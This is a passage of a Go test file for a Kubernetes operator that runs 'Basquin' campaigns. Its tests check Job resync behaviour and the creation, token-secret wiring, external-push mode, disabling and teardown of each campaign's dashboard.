	It("does not rerun on resync when the spec is unchanged (grammar-key resolution is not a diff)", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, &corev1.ConfigMap{
			ObjectMeta: metav1.ObjectMeta{Name: "sh-gram-" + fmt.Sprint(runID), Namespace: namespace},
			Data:       map[string]string{"only.grammar": "/x\n"}})).To(Succeed())
		c := newCampaign()
		c.Spec.Driver.GrammarConfigMap = "sh-gram-" + fmt.Sprint(runID) // no key → resolved in-memory
		Expect(k8sClient.Create(ctx, c)).To(Succeed())
		_, err := reconcileOnce() // creates the Job
		Expect(err).NotTo(HaveOccurred())
		h1 := getJob(jobKey).Annotations[specHashAnnotation]

		// Resync with no spec change must NOT delete/recreate (the in-memory GrammarKey resolution
		// mutates the spec object but isn't persisted, so it must not read as a hash diff).
		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())
		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.Phase).To(Equal(basquinv1alpha1.CampaignRunning))  // not Provisioning
		Expect(getJob(jobKey).Annotations[specHashAnnotation]).To(Equal(h1)) // same Job, same hash
	})

	// --- P5b: per-campaign dashboard ------------------------------------------------------------
	dashKey := func() types.NamespacedName {
		return types.NamespacedName{Name: campaignName + "-dashboard", Namespace: namespace}
	}

	It("creates a per-campaign dashboard by default and wires the driver push at it", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, newCampaign())).To(Succeed()) // dashboard.enabled defaults true
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		// Dashboard Deployment + Service exist, run the dashboard image, owner-ref'd to the campaign.
		dep := &appsv1.Deployment{}
		Expect(k8sClient.Get(ctx, dashKey(), dep)).To(Succeed())
		Expect(dep.Spec.Template.Spec.Containers[0].Image).To(Equal(dashImg))
		Expect(dep.OwnerReferences).To(ContainElement(HaveField("Name", campaignName)))
		// The probe must stay on the ONE unauthenticated endpoint: probes can't send the token,
		// and every data-bearing read is token-gated since DD-028 — /api/* here would deadlock
		// readiness against auth.
		Expect(dep.Spec.Template.Spec.Containers[0].ReadinessProbe.HTTPGet.Path).To(Equal("/healthz"))
		svc := &corev1.Service{}
		Expect(k8sClient.Get(ctx, dashKey(), svc)).To(Succeed())
		Expect(svc.Spec.Ports[0].Port).To(Equal(int32(dashboardPort)))
		Expect(svc.OwnerReferences).To(ContainElement(HaveField("Name", campaignName)))

		// The driver pushes at the in-cluster dashboard Service, grouped under the campaign id.
		wantPush := fmt.Sprintf("%s-dashboard.%s.svc.cluster.local:%d", campaignName, namespace, dashboardPort)
		jto := envValue(getJob(jobKey).Spec.Template.Spec.Containers[0].Env, "JAVA_TOOL_OPTIONS")
		Expect(jto).To(ContainSubstring("-Dbasquin.dashboard.push=" + wantPush))
		Expect(jto).To(ContainSubstring("-Dbasquin.dashboard.id=" + campaignName))

		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.DashboardURL).To(Equal("http://" + wantPush))

		// Write-path auth (#43): the token Secret exists, is owner-ref'd to the campaign (GC'd with
		// it), and BOTH pods source BASQUIN_DASHBOARD_TOKEN from it via SecretKeyRef, referenced
		// through $(VAR) expansion inside JAVA_TOOL_OPTIONS.
		secKey := types.NamespacedName{Name: campaignName + "-dashboard-token", Namespace: namespace}
		sec := &corev1.Secret{}
		Expect(k8sClient.Get(ctx, secKey, sec)).To(Succeed())
		Expect(sec.OwnerReferences).To(ContainElement(HaveField("Name", campaignName)))
		tok := string(sec.Data[dashboardTokenKey])
		Expect(tok).To(HaveLen(64)) // 256 bits, hex-encoded

		expectTokenEnv := func(env []corev1.EnvVar) {
			GinkgoHelper()
			for _, e := range env {
				if e.Name == dashboardTokenEnvVar {
					Expect(e.ValueFrom).NotTo(BeNil())
					Expect(e.ValueFrom.SecretKeyRef).NotTo(BeNil())
					Expect(e.ValueFrom.SecretKeyRef.Name).To(Equal(secKey.Name))
					Expect(e.ValueFrom.SecretKeyRef.Key).To(Equal(dashboardTokenKey))
					return
				}
			}
			Fail(dashboardTokenEnvVar + " env var not found")
		}
		expectTokenEnv(dep.Spec.Template.Spec.Containers[0].Env)
		Expect(envValue(dep.Spec.Template.Spec.Containers[0].Env, "JAVA_TOOL_OPTIONS")).
			To(ContainSubstring("-Dbasquin.dashboard.token=$(" + dashboardTokenEnvVar + ")"))
		expectTokenEnv(getJob(jobKey).Spec.Template.Spec.Containers[0].Env)
		Expect(jto).To(ContainSubstring("-Dbasquin.dashboard.token=$(" + dashboardTokenEnvVar + ")"))

		// A second reconcile must REUSE the Secret (get-or-create), never re-mint: rotation
		// mid-campaign would leave a running dashboard and a running driver disagreeing.
		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())
		Expect(k8sClient.Get(ctx, secKey, sec)).To(Succeed())
		Expect(string(sec.Data[dashboardTokenKey])).To(Equal(tok))
	})

	It("uses externalPush and creates no dashboard of its own", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		c := newCampaign()
		c.Spec.Dashboard.ExternalPush = "fleet-dashboard.other.svc:7070"
		Expect(k8sClient.Create(ctx, c)).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		// No per-campaign dashboard is created; the driver pushes at the external one.
		Expect(k8sClient.Get(ctx, dashKey(), &appsv1.Deployment{})).NotTo(Succeed())
		Expect(k8sClient.Get(ctx, dashKey(), &corev1.Service{})).NotTo(Succeed())
		jto := envValue(getJob(jobKey).Spec.Template.Spec.Containers[0].Env, "JAVA_TOOL_OPTIONS")
		Expect(jto).To(ContainSubstring("-Dbasquin.dashboard.push=fleet-dashboard.other.svc:7070"))

		// Not our dashboard → no token Secret is minted and no token flag is sent (#43).
		Expect(k8sClient.Get(ctx,
			types.NamespacedName{Name: campaignName + "-dashboard-token", Namespace: namespace},
			&corev1.Secret{})).NotTo(Succeed())
		Expect(jto).NotTo(ContainSubstring("-Dbasquin.dashboard.token"))

		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.DashboardURL).To(Equal("http://fleet-dashboard.other.svc:7070"))
	})

	It("creates no dashboard and pushes nowhere when dashboard is disabled", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		c := newCampaign()
		c.Spec.Dashboard.Enabled = boolPtr(false) // *bool so this survives admission (not re-defaulted)
		Expect(k8sClient.Create(ctx, c)).To(Succeed())
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		Expect(k8sClient.Get(ctx, dashKey(), &appsv1.Deployment{})).NotTo(Succeed())
		jto := envValue(getJob(jobKey).Spec.Template.Spec.Containers[0].Env, "JAVA_TOOL_OPTIONS")
		Expect(jto).NotTo(ContainSubstring("-Dbasquin.dashboard.push"))

		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.DashboardURL).To(BeEmpty())
	})

	It("tears down a per-campaign dashboard when it is later disabled (review #21)", func() {
		Expect(k8sClient.Create(ctx, newTargetDeploy())).To(Succeed())
		makeInjectedTarget()
		Expect(k8sClient.Create(ctx, newCampaign())).To(Succeed()) // default: dashboard on
		_, err := reconcileOnce()
		Expect(err).NotTo(HaveOccurred())
		Expect(k8sClient.Get(ctx, dashKey(), &appsv1.Deployment{})).To(Succeed()) // created

		// Flip dashboard off on the existing campaign (spec.dashboard isn't immutable).
		c := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, c)).To(Succeed())
		c.Spec.Dashboard.Enabled = boolPtr(false)
		Expect(k8sClient.Update(ctx, c)).To(Succeed())
		_, err = reconcileOnce()
		Expect(err).NotTo(HaveOccurred())

		// The orphaned Deployment + Service are removed, not left running until CR deletion.
		Eventually(func() bool {
			return k8sClient.Get(ctx, dashKey(), &appsv1.Deployment{}) != nil &&
				k8sClient.Get(ctx, dashKey(), &corev1.Service{}) != nil
		}).Should(BeTrue())
		got := &basquinv1alpha1.BasquinCampaign{}
		Expect(k8sClient.Get(ctx, campaignKey, got)).To(Succeed())
		Expect(got.Status.DashboardURL).To(BeEmpty())
	})
})

func getJob(key types.NamespacedName) *batchv1.Job {
	job := &batchv1.Job{}
	ExpectWithOffset(1, k8sClient.Get(context.Background(), key, job)).To(Succeed())
	return job
}

func boolPtr(b bool) *bool { return &b }
